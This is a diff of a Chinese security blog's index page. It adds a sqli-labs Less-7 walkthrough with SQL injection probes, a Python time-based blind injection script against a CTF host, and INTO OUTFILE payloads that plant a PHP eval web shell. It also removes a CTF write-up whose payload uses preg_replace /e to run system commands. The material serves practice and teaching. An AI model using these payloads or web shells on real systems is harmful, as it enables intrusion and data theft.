@@ -288,6 +288,209 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/13/sqli-labs(7)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="花间一壶酒">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2021/02/13/sqli-labs(7)/" itemprop="url">sqli-labs(7)</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-02-13T17:17:45+08:00">
+                2021-02-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="Less-7-GET-Dump-into-outfile-String-（导出文件GET字符型注入）"><a href="#Less-7-GET-Dump-into-outfile-String-（导出文件GET字符型注入）" class="headerlink" title="Less-7 GET - Dump into outfile - String （导出文件GET字符型注入）"></a>Less-7 GET - Dump into outfile - String （导出文件GET字符型注入）</h2><p><img src="https://img-blog.csdnimg.cn/20210223083630360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">判断注入</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210223083613998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入不存在的id，或者尝试sql注入都不会显示具体报错信息<br>，所以联合查询和报错注入都失效了。</p>
+<p>去源码里看一下，<br><img src="https://img-blog.csdnimg.cn/20210223084632297.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1&#x27;</span>)) <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span> --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210223092004235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70"></p>
+<p>查询列数：<code>?id=1&#39;)) order by 3 --+</code></p>
+<p>绝对路径<br>这里因为不知道具体的绝对路径，所以返回第一关去看一下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-1</span>/?id=<span class="number">-1</span>%<span class="number">27</span>%<span class="number">20u</span>nion%<span class="number">20</span>select%<span class="number">20</span>null,@@datadir,@@basedir%<span class="number">20</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210223090540124.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h1 id="时间盲注脚本"><a href="#时间盲注脚本" class="headerlink" title="时间盲注脚本"></a>时间盲注脚本</h1><p>使用脚本的sleep函数时间自行控制，因为不同服务器的响应时间不同，sleep时间越久，越准确。因为若sleep时间短了，有可能因为本身服务器响应较慢导致爆破出来的值错误。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">table=&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_&#123;&#125;&quot;</span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    <span class="keyword">for</span> i in table:</span><br><span class="line">        ss = time.time()</span><br><span class="line">        data = &#123;</span><br><span class="line">            &#x27;datebase&#x27;:&#x27;&#x27;&#x27;ELT(left((SELECT schema_name FROM information_schema.schemata limit 0,1),&#123;&#125;)=&#x27;&#123;&#125;&#123;&#125;&#x27;,SLEEP(5))&#x27;&#x27;&#x27;.format(len(flag)+1,flag, i),</span><br><span class="line">            &#x27;table&#x27;:&#x27;&#x27;&#x27;ELT(left((SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;ctftraining&quot; limit 0,1),&#123;&#125;)=&#x27;&#123;&#125;&#123;&#125;&#x27;,SLEEP(5))&#x27;&#x27;&#x27;.format(len(flag)+1,flag, i),</span><br><span class="line">            &#x27;column&#x27;:&#x27;&#x27;&#x27;ELT(left((SELECT column_name FROM information_schema.columns WHERE table_name = &#x27;flag&#x27; limit 0,1),&#123;&#125;)=&#x27;&#123;&#125;&#123;&#125;&#x27;,SLEEP(5))&#x27;&#x27;&#x27;.format(len(flag)+1,flag, i),</span><br><span class="line">            &#x27;flag&#x27;:&#x27;&#x27;&#x27;ELT(left((SELECT flag FROM ctftraining.flag limit 0,1),&#123;&#125;)=&#x27;&#123;&#125;&#123;&#125;&#x27;,SLEEP(5))&#x27;&#x27;&#x27;.format(len(flag)+1,flag, i),</span><br><span class="line">        &#125;</span><br><span class="line">        #url=&quot;http://e40ffbdc-1bae-4621-a7c4-4326289ff1d6.node1.buuoj.cn/Less-7/?id=1&#x27;)) union select 1,1,(&quot;+data[&#x27;datebase&#x27;]+&quot;)--+&quot; #查找数据库</span><br><span class="line"></span><br><span class="line">        #url=&quot;http://e40ffbdc-1bae-4621-a7c4-4326289ff1d6.node1.buuoj.cn/Less-7/?id=1&#x27;)) union select 1,1,(&quot;+data[&#x27;table&#x27;]+&quot;)--+&quot; #查表名</span><br><span class="line">        #url=&quot;http://e40ffbdc-1bae-4621-a7c4-4326289ff1d6.node1.buuoj.cn/Less-7/?id=1&#x27;)) union select 1,1,(&quot;+data[&#x27;column&#x27;]+&quot;)--+&quot; #查字段名</span><br><span class="line">        url=&quot;http://e40ffbdc-1bae-4621-a7c4-4326289ff1d6.node1.buuoj.cn/Less-7/?id=1&#x27;)) union select 1,1,(&quot;+data[&#x27;flag&#x27;]+&quot;)--+&quot; #查数据</span><br><span class="line">        t=requests.get(url)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> time.time()-ss&gt;=<span class="number">4</span>:</span><br><span class="line">            flag += i</span><br><span class="line">            print (flag)</span><br></pre></td></tr></table></figure>
+
+<pre><code>break
+</code></pre>
+<h1 id="利用dump-into-file功能写入小马"><a href="#利用dump-into-file功能写入小马" class="headerlink" title="利用dump into file功能写入小马"></a>利用dump into file功能写入小马</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">注意：</span><br><span class="line"></span><br><span class="line">对文件进行导入导出首先得要有足够的权限，</span><br><span class="line">但是mysql默认不能导入和导出文件，这与secure_file_priv的值有关（默认为null)</span><br><span class="line">secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。</span><br><span class="line"><span class="number">1</span>、当secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出</span><br><span class="line"><span class="number">2</span>、当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下</span><br><span class="line"><span class="number">3</span>、当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</span><br><span class="line">用以下命令查看secure_file_priv的值</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%secure%&#x27;；</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210223145245410.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><code>如果是null，想得到导入导出权限，可以在my.ini文件[mysqld]的后面加上secure_file_priv=&#39;&#39;（两个英文单引号），然后重启phpstudy即可</code></p>
+<pre><code>还要注意的是：
+1、outfire 后面的路径为绝对路径且存在
+2、要有足够的权限
+3、注入的内容也可以是字符串，句子
+4、要想注入新内容，需要新的文件名
+
+这里写入文件的时候，需要注意的是利用数据库file权限向操作系统写入文件时，对于相同文件名的文件不能覆盖，所以如果第一次上传test.php，下次再上传test.php，就是无效命令了，也就是新的test.php中的内容并不会覆盖之前的test.php
+</code></pre>
+<p>读写权限测试：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1&#x27;</span>)) <span class="keyword">and</span> (select count(*) from mysql.user)&gt;<span class="number">0</span> --+</span><br></pre></td></tr></table></figure>
+<p>如果返回正常则有读取权限<br><img src="https://img-blog.csdnimg.cn/2021022314332125.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>MySQL是通过权限表来控制用户对数据库访问的，权限表存放在mysql数据库中，主要的权限表有以下几个：user,db,host,table_priv,columns_priv和procs_priv。<br>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/liuhaidon/archive/2019/09/12/11511129.html">https://www.cnblogs.com/liuhaidon/archive/2019/09/12/11511129.html</a></p>
+<p>利用into outfile 进行演示：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1&#x27;</span>)) <span class="keyword">union</span> select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> into outfile <span class="string">&quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\test.txt&quot;</span> -- #</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210223145410868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>上图中显示 sql 出错了，但是没有关系，我们可以在浏览器或后台中看到 test.txt 文件已经生成了</p>
+<p><img src="https://img-blog.csdnimg.cn/20210223145449679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>导入到文件我们可以直接将一句话木马导入进去—-（注意：$_POST是php的内置变量，而且php还区分大小写的，所以这里一定要写正确）</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) union select 1,2,&#x27;&lt;?php @eval($_POST[&quot;mima&quot;])?&gt;&#x27; into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\test.php&quot; -- #</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://img-blog.csdnimg.cn/20210223145608139.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="上图中显示sql出错了，但是没有关系，我们可以在文件中看到uuu.txt已经生成了。"><br><img src="https://img-blog.csdnimg.cn/20210223145642398.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 连接蚁剑<br> <img src="https://img-blog.csdnimg.cn/20210223145828177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h1 id="利用dump-into-file功能"><a href="#利用dump-into-file功能" class="headerlink" title="利用dump into file功能"></a>利用dump into file功能</h1><p>1.获取字段数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1&#x27;</span>)) order by <span class="number">3</span> -- #</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210223150208353.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1&#x27;</span>)) order by <span class="number">4</span> -- #</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210223150234657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">当前表有3个字段。</p>
+<p>2.导出数据库名</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1&#x27;</span>)) <span class="keyword">union</span> select <span class="number">1</span>,user(),database() into outfile <span class="string">&quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\aaa.txt&quot;</span> -- #</span><br></pre></td></tr></table></figure>
+<p>（PS： 让id=-1是因为我们不需要id为几的数据，我们要的是联合查询union后面查询的数据。）</p>
+<p><img src="https://img-blog.csdnimg.cn/20210223151131366.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">3.导出表名</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;)) union select 1,2,table_name from information_schema.tables where table_schema=&#x27;security&#x27; into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\bbb.txt&quot; -- #</span><br></pre></td></tr></table></figure>
+<p>（注意：这里文件名换了。要想注入新内容，需要新的文件名）<br><img src="https://img-blog.csdnimg.cn/20210223151528495.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">4.导出字段名</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;)) union select 1,2,column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\ccc.txt&quot; -- #</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210223151637242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">5.导出数据</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1&#x27;</span>)) <span class="keyword">union</span> select * from users into outfile <span class="string">&quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\ddd.txt&quot;</span> -- #</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210223151835666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h1 id="导入导出函数"><a href="#导入导出函数" class="headerlink" title="导入导出函数"></a>导入导出函数</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@@datadir——数据库存储路径</span><br><span class="line">@@basedir——Mysql安装路径</span><br><span class="line">dumpfile——导出文件，类似outfile；不同的是，dumpfile一次导出一行，会和limit结合使用</span><br><span class="line">load_file()——将文件导入mysql，用法<span class="function">select <span class="title">load_file</span><span class="params">(<span class="string">&quot;文件路径&quot;</span>)</span></span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">使用select ... into outfile以逗号分隔字段的方式将数据导入到一个文件中：</span><br><span class="line">select * into outfile &#x27;D:\\log1.txt&#x27; fields terminated by &#x27;,&#x27; from log.log1</span><br><span class="line"></span><br><span class="line">将刚刚导出的文件log1.txt导入到表log1相同结构的log2中：</span><br><span class="line">load data infile &#x27;D:\\log1.txt&#x27; into table aa.log2 fields terminated by &#x27;,&#x27;</span><br><span class="line"></span><br><span class="line">使用select * into outfile导出：</span><br><span class="line">select * into outfile &#x27;D:\\test.txt&#x27; fields terminated by &#x27;,&#x27; optionally enclosed by &#x27;&quot;&#x27; lines terminated by &#x27;\n&#x27; from test.table</span><br><span class="line"></span><br><span class="line">导入：</span><br><span class="line">load data infile &#x27;/tm/fi.txt&#x27; into table test.fii fields terminated by &#x27;,&#x27; optionally enclosed by &#x27;&quot;&#x27; lines terminated by &#x27;\n&#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fields terminated by <span class="string">&#x27;,&#x27;</span>——字段间分割符</span><br><span class="line">optionally enclosed by <span class="string">&#x27;&quot;&#x27;</span>——将字段包围，对数值型无效</span><br><span class="line">lines terminated by <span class="string">&#x27;\n&#x27;</span>——换行符</span><br></pre></td></tr></table></figure>
+
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/12/sqli-labs(5-6)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1730,152 +1933,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/03/20210203/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="花间一壶酒">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2021/02/03/20210203/" itemprop="url">（BJDCTF2020）ZJCTF，不过如此</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-02-03T17:17:45+08:00">
-                2021-02-03
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index">
-                    <span itemprop="name">web</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><p><img src="https://img-blog.csdnimg.cn/20210209162454557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210209162931298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">base64解码</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$_SESSION[&#x27;id&#x27;] = $id;</span><br><span class="line"></span><br><span class="line"><span class="function">function <span class="title">complex</span><span class="params">($re, $str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        &#x27;/(&#x27; . $re . &#x27;)/ei&#x27;,</span><br><span class="line">        &#x27;strtolower(&quot;\\1&quot;)&#x27;,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">foreach($_GET as $re =&gt; $str) &#123;</span><br><span class="line">    echo complex($re, $str). &quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">function <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">	@eval($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2557">preg_replace</a>的/e参数，可以造成远程代码执行漏洞。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/next.php?\S*=$&#123;getFlag()&#125;&amp;cmd=system(%<span class="number">27</span>cat%<span class="number">20</span>/flag%<span class="number">27</span>); <span class="comment">//next.php?\S*=$&#123;getFlag()&#125;&amp;cmd=system(‘cat /flag’);</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210209163422244.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">此外<code>php://input</code>也可以使用<code>data://text/plain</code><br><img src="https://img-blog.csdnimg.cn/20210209163520726.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1926,7 +1983,7 @@
               
                 <a href="/archives%7C%7C%20archive">
               
-                  <span class="site-state-item-count">36</span>
+                  <span class="site-state-item-count">37</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
